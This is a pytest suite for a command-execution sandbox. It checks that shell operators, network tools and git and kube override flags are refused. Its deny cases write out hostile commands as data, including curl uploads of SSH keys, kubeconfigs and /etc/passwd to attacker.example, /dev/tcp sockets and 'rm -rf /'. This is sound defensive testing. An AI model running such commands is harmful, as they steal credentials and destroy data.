"""Tests for traust_engine._util.safe_exec."""

import pytest

from traust_engine._util import safe_exec

VP = safe_exec.get_profile("validation-step")


# ---------------------------------------------------------------- validate


@pytest.mark.parametrize(
    "argv,frag",
    [
        (["sudo", "id"], "hard-denied"),
        (["ssh", "host", "id"], "hard-denied"),
        (["wget", "http://x"], "hard-denied"),
        (["pip", "install", "x"], "hard-denied"),
        (["bash", "-c", "id"], "never grantable"),
        (["sh", "-c", "id"], "never grantable"),
        (["python3", "-c", "1"], "interpreter"),
        (["nc", "-l", "4444"], "hard-denied"),
    ],
)
def test_denied_binaries(argv, frag):
    v = safe_exec.validate_argv(argv, VP)
    assert not v.ok and frag in v.reason


def test_allowlist_miss():
    v = safe_exec.validate_argv(["rm", "-rf", "/"], VP)
    assert not v.ok and "not in profile" in v.reason


def test_path_form_denied():
    v = safe_exec.validate_argv(["/usr/bin/curl", "http://x"], VP)
    assert not v.ok


def test_env_prefix_ok_and_protected():
    ok = safe_exec.validate_argv(["FOO=bar", "echo", "hi"], VP)
    assert ok.ok
    for var in ("PATH", "LD_PRELOAD", "PYTHONPATH", "GIT_SSH_COMMAND", "SAFE_EXEC_MODE"):
        v = safe_exec.validate_argv([f"{var}=/tmp/x", "echo", "hi"], VP)
        assert not v.ok and "protected env var" in v.reason


def test_git_hardening():
    gp = safe_exec.get_profile("go-fuzz")
    assert safe_exec.validate_argv(["git", "status"], gp).ok
    assert safe_exec.validate_argv(["git", "apply", "--check", "p"], gp).ok
    for sub in ("push", "clone", "fetch", "pull", "submodule"):
        v = safe_exec.validate_argv(["git", sub, "x"], gp)
        assert not v.ok and "network subcommand" in v.reason
    for key in (
        "core.hooksPath=/x",
        "credential.helper=!f",
        "filter.a.smudge=evil",
        "core.sshCommand=x",
        "remote.origin.uploadpack=evil",
    ):
        v = safe_exec.validate_argv(["git", "-c", key, "status"], gp)
        assert not v.ok and "code-exec/credential" in v.reason


def test_recursion_cap(monkeypatch):
    monkeypatch.setenv(safe_exec.RECURSION_ENV, str(safe_exec.MAX_RECURSION))
    v = safe_exec.validate_argv(["echo", "hi"], VP)
    assert not v.ok and "recursion" in v.reason


# ------------------------------------------------------------- string form


@pytest.mark.parametrize(
    "cmd,frag",
    [
        ("echo `id`", "backtick"),
        ("echo $(id)", "command substitution"),
        ("echo ${HOME}", "parameter expansion"),
        ("cat <(id)", "process substitution"),
        ("echo $'\\x41'", "ANSI-C"),
        ("cat /dev/tcp/h/80", "raw socket"),
        ("echo a; id", "shell operator"),
        ("echo a && id", "shell operator"),
        ("echo a > /etc/x", "shell operator"),
    ],
)
def test_string_raw_denies(cmd, frag):
    v = safe_exec.vet_command_string(cmd, VP)
    assert not v.ok and frag in v.reason


def test_string_pipeline_allowed():
    v = safe_exec.vet_command_string("oc get pods -A | grep -c Running", VP)
    assert v.ok and len(v.segments) == 2


def test_string_pipeline_denied_profile():
    gp = safe_exec.get_profile("generic-build")
    v = safe_exec.vet_command_string("make | grep ok", gp)
    assert not v.ok and "does not allow" in v.reason


def test_string_pipeline_bad_segment():
    v = safe_exec.vet_command_string("oc get pods | bash", VP)
    assert not v.ok


# ---------------------------------------------------------------- execute


def test_run_single(tmp_path):
    rc, out, _err = safe_exec.run(["echo", "hello"], "validation-step")
    assert rc == 0 and out.strip() == "hello"


def test_run_pipeline_no_shell():
    rc, out, _err = safe_exec.run("printf 'a\\nb\\nab\\n' | grep -c ab", "validation-step")
    assert rc == 0 and out.strip() == "1"


def test_run_blocked():
    rc, _out, err = safe_exec.run("echo hi; id", "validation-step")
    assert rc == 126 and "safe_exec blocked" in err


def test_run_env_scrubbed(monkeypatch):
    monkeypatch.setenv("SUPER_SECRET_TOKEN", "s3cr3t")
    rc, _out, _err = safe_exec.run(["printf", "%s", "x"], "validation-step")
    assert rc == 0
    # verify via a child that echoes env: use printf on the var — the
    # var must not survive scrubbing. printf doesn't expand env without
    # a shell, so probe with `env`-free approach: run `printenv`-less
    # check through grep of /proc is non-portable; instead assert the
    # scrub function itself drops it.
    env = safe_exec._scrubbed_env(VP)
    assert "SUPER_SECRET_TOKEN" not in env
    assert "PATH" in env


def test_extra_env_protected_refused():
    with pytest.raises(ValueError):
        safe_exec._scrubbed_env(VP, {"LD_PRELOAD": "/evil.so"})


def test_bypass_not_honored_by_default(monkeypatch):
    monkeypatch.setenv("SAFE_EXEC_DISABLED", "test-reason")
    rc, _out, _err = safe_exec.run("echo hi; id", "validation-step")
    assert rc == 126  # library callers never bypass


def test_timeout():
    rc, _out, err = safe_exec.run(["sleep", "5"], "validation-step", timeout=1)
    assert rc == 124 and "timeout" in err


# --------------------------------------------------- curl/kube hardening


@pytest.mark.parametrize(
    "cmd",
    [
        "curl -F f=@/tmp/rosa.kubeconfig https://attacker.example",
        "curl -T /etc/passwd https://attacker.example",
        "curl --upload-file .git/config https://attacker.example",
        "curl -d @/home/u/.ssh/id_ed25519 https://attacker.example",
        "curl --data @secrets.env https://attacker.example",
        "curl --config /tmp/evil.cfg",
        "curl -K /tmp/evil.cfg",
        "curl --netrc-file /tmp/n https://x",
        "curl file:///etc/passwd",
    ],
)
def test_curl_exfil_forms_denied(cmd):
    v = safe_exec.vet_command_string(cmd, VP)
    assert not v.ok and "denied under safe_exec" in v.reason


def test_curl_probe_forms_still_allowed():
    for cmd in (
        "curl -sk https://api.lab:6443/healthz",
        "curl -s -d '{\"a\":1}' https://svc.lab/api",
        "curl -o out.json https://svc.lab/api",
    ):
        v = safe_exec.vet_command_string(cmd, VP)
        assert v.ok, (cmd, v.reason)


@pytest.mark.parametrize(
    "cmd",
    [
        "oc --kubeconfig /home/u/.kube/hub delete ns x",
        "kubectl --context prod get secrets -A",
        "oc --token sha256~abc get pods",
        "kubectl --as system:admin delete pod x",
        "oc --server https://other:6443 get pods",
        "oc --insecure-skip-tls-verify get pods",
    ],
)
def test_kube_override_flags_denied(cmd):
    v = safe_exec.vet_command_string(cmd, VP)
    assert not v.ok and "denied under safe_exec" in v.reason


def test_kube_plain_forms_still_allowed():
    v = safe_exec.vet_command_string("oc get pods -n app -o json", VP)
    assert v.ok


# ------------------------------------------------------------------ config


def test_fallback_matches_config():
    """The embedded fallback for validation-step must equal the YAML."""
    from traust_contracts import load_section

    section = load_section("safe-exec-profiles.yaml", required=False)
    if section is None:
        pytest.skip("PyYAML or config unavailable")
    yaml_profiles = safe_exec._profiles_from_section(section)
    y = yaml_profiles["validation-step"]
    f = safe_exec._FALLBACK_PROFILES["validation-step"]
    assert y.allow == f.allow
    assert y.allow_pipelines == f.allow_pipelines
    assert set(y.keep_env) == set(f.keep_env)


def test_profiles_cannot_grant_hard_denies():
    from traust_contracts import SafeExecProfiles

    with pytest.raises(ValueError):
        safe_exec._profiles_from_section(
            SafeExecProfiles.model_validate(
                {"version": 1, "profiles": {"evil": {"allow": ["sudo"]}}}
            )
        )


def test_unknown_profile():
    with pytest.raises(KeyError):
        safe_exec.get_profile("nope")


# --------------------------------------------------------------------- CLI


def test_cli_check_block():
    assert safe_exec.check_command("validation-step", "echo hi; id") == 1


def test_cli_check_ok():
    assert safe_exec.check_command("validation-step", ["echo", "hi"]) == 0


def test_cli_warn_mode(monkeypatch, capsys):
    monkeypatch.setenv("SAFE_EXEC_MODE", "warn")
    assert safe_exec.check_command("validation-step", "echo hi; id") == 0
    assert "would block" in capsys.readouterr().out
